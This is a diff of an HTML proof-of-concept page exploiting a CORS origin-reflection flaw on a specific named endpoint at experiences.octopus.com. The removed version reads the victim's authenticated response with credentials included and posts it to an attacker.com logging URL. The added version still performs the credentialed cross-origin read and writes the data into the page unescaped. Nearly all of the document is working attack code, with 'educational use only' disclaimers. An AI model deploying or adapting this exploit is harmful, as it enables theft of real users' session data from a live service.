@@ -1,273 +1,49 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>CORS Exploit PoC</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <head>
+    <title>CORS Vulnerability PoC</title>
+  </head>
+  <body>
+    <h1>CORS Vulnerability Proof of Concept</h1>
+    <p>This page demonstrates a Cross-Origin Resource Sharing (CORS) misconfiguration on the target domain. The server incorrectly reflects the 'Origin' header, allowing an attacker to read sensitive data from a victim's browser session.</p>
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-            color: #333;
-        }
+    <div id="result"></div>
 
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 15px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-        }
-
-        .header {
-            background: linear-gradient(135deg, #ff4757, #ff3838);
-            color: white;
-            padding: 30px;
-            text-align: center;
-        }
-
-        .header h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-        }
-
-        .header p {
-            font-size: 1.1em;
-            opacity: 0.9;
-            line-height: 1.6;
-        }
-
-        .content {
-            padding: 40px;
-        }
-
-        .warning-box {
-            background: #fff3cd;
-            border: 2px solid #ffeaa7;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 30px;
-            position: relative;
-        }
-
-        .warning-box::before {
-            content: "⚠️";
-            position: absolute;
-            top: -15px;
-            left: 20px;
-            background: #fff3cd;
-            padding: 5px 10px;
-            border-radius: 50%;
-            font-size: 1.5em;
-        }
-
-        .warning-box h3 {
-            color: #856404;
-            margin-bottom: 10px;
-            font-size: 1.3em;
-        }
-
-        .warning-box p {
-            color: #856404;
-            line-height: 1.6;
-        }
-
-        .target-section {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 30px;
-            border-left: 5px solid #dc3545;
-        }
-
-        .target-section h3 {
-            color: #dc3545;
-            margin-bottom: 15px;
-            font-size: 1.4em;
-        }
-
-        .url-display {
-            background: #2d3748;
-            color: #68d391;
-            padding: 15px;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            word-break: break-all;
-            margin: 15px 0;
-            border: 1px solid #4a5568;
-        }
-
-        .data-section {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 25px;
-            border: 2px solid #28a745;
-        }
-
-        .data-section h3 {
-            color: #28a745;
-            margin-bottom: 15px;
-            font-size: 1.4em;
-        }
-
-        .stolen-data {
-            background: #ffffff;
-            border: 2px solid #ced4da;
-            border-radius: 8px;
-            padding: 20px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            min-height: 200px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            overflow-x: auto;
-            color: #333;
-            line-height: 1.4;
-        }
-
-        .loading {
-            display: none;
-            text-align: center;
-            padding: 20px;
-            color: #6c757d;
-        }
-
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #dc3545;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .footer {
-            background: #343a40;
-            color: white;
-            text-align: center;
-            padding: 20px;
-            font-size: 0.9em;
-        }
-
-        .footer a {
-            color: #17a2b8;
-            text-decoration: none;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                margin: 10px;
-                border-radius: 10px;
-            }
-            
-            .header h1 {
-                font-size: 2em;
-            }
-            
-            .content {
-                padding: 20px;
-            }
-            
-            .url-display {
-                font-size: 0.8em;
-            }
-        }
-    </style>
     <script>
-        // Target the vulnerable endpoint
-        const targetUrl = "https://experiences.octopus.com/edit/user/S5MXxSUXSwK14Z8keWBBd6Fq3w6UFIsisQh74967mTyL9P-1RWXG9-F6slQQ10ZwKLtXEa/elements.js";
+      // The vulnerable endpoint URL
+      const VULNERABLE_URL = 'https://experiences.octopus.com/edit/user/S5MXxSUXSwK14Z8keWBBd6Fq3w6UFIsisQh74967mTyL9P-1RWXG9-F6slQQ10ZwKLtXEa/elements.js';
 
-        // Show loading state
-        document.addEventListener('DOMContentLoaded', function() {
-            const loadingDiv = document.getElementById('loading');
-            const dataDiv = document.getElementById('stolen-data');
-            
-            loadingDiv.style.display = 'block';
-            dataDiv.textContent = 'Loading...';
+      // Make a cross-origin request to the vulnerable endpoint
+      fetch(VULNERABLE_URL, {
+        method: 'GET',
+        // 'credentials: "include"' is crucial for sending cookies
+        credentials: 'include'
+      })
+      .then(response => {
+        // Log the response headers to show the reflection
+        console.log('Server Response Headers:', response.headers);
 
-            // Fetch the sensitive data
-            fetch(targetUrl, {
-                credentials: "include"  // Include cookies if needed
-            })
-            .then(response => response.text())
-            .then(data => {
-                // Hide loading and display stolen data
-                loadingDiv.style.display = 'none';
-                dataDiv.textContent = data;
-
-                // Exfiltrate data to attacker's server (replace with your server)
-                fetch("https://attacker.com/log", {
-                    method: "POST",
-                    body: JSON.stringify({ stolen: data }),
-                    headers: { "Content-Type": "application/json" }
-                }).catch(err => {
-                    console.log("Exfiltration failed (expected):", err);
-                });
-            })
-            .catch(error => {
-                // Hide loading and show error
-                loadingDiv.style.display = 'none';
-                dataDiv.textContent = 'Exploit failed: ' + error.message;
-                console.error("Exploit failed:", error);
-            });
-        });
+        // Check for the vulnerable header.
+        const allowOriginHeader = response.headers.get('Access-Control-Allow-Origin');
+        if (allowOriginHeader === window.location.origin) {
+          console.log('Vulnerability Confirmed. The server reflected the origin:', allowOriginHeader);
+          return response.text();
+        } else {
+          console.log('CORS vulnerability not found. The server did not reflect the origin.');
+          throw new Error('CORS vulnerability not found');
+        }
+      })
+      .then(data => {
+        // Display the sensitive data that was successfully read
+        document.getElementById('result').innerHTML = '<h2>Vulnerability Confirmed!</h2>' +
+                                                     '<p>Sensitive data was successfully read from the victim\'s session.</p>' +
+                                                     '<textarea rows="15" cols="80">' + data + '</textarea>';
+        console.log('Successfully read sensitive data:', data);
+      })
+      .catch(error => {
+        // Handle any errors
+        console.error('Error:', error);
+        document.getElementById('result').innerHTML = '<p style="color:red;">Error: ' + error.message + '</p>';
+      });
     </script>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>🚨 CORS Exploit PoC</h1>
-            <p>Cross-Origin Resource Sharing Exploitation Demonstration</p>
-        </div>
-
-        <div class="content">
-            <div class="warning-box">
-                <h3>Security Warning</h3>
-                <p>This page demonstrates a CORS exploitation technique. The target server incorrectly reflects the 'Origin' header, allowing an attacker to read sensitive data from authenticated user sessions. This is for educational and authorized security testing purposes only.</p>
-            </div>
-
-            <div class="target-section">
-                <h3>🎯 Target Endpoint</h3>
-                <div class="url-display" id="targetUrl">
-                    https://experiences.octopus.com/edit/user/S5MXxSUXSwK14Z8keWBBd6Fq3w6UFIsisQh74967mTyL9P-1RWXG9-F6slQQ10ZwKLtXEa/elements.js
-                </div>
-                <p><strong>Attack Vector:</strong> The server reflects the Origin header in Access-Control-Allow-Origin, allowing cross-origin requests with credentials.</p>
-            </div>
-
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p>Exploiting CORS vulnerability...</p>
-            </div>
-
-            <div class="data-section">
-                <h3>📋 Stolen Data from <code>experiences.octopus.com</code></h3>
-                <pre class="stolen-data" id="stolen-data">Waiting for exploit to complete...</pre>
-            </div>
-        </div>
-
-        <div class="footer">
-            <p>⚠️ <strong>Educational Purpose Only</strong> - This tool is designed for security researchers and developers to understand CORS vulnerabilities.</p>
-            <p>For responsible disclosure and security testing only.</p>
-        </div>
-    </div>
-</body>
+  </body>
 </html>
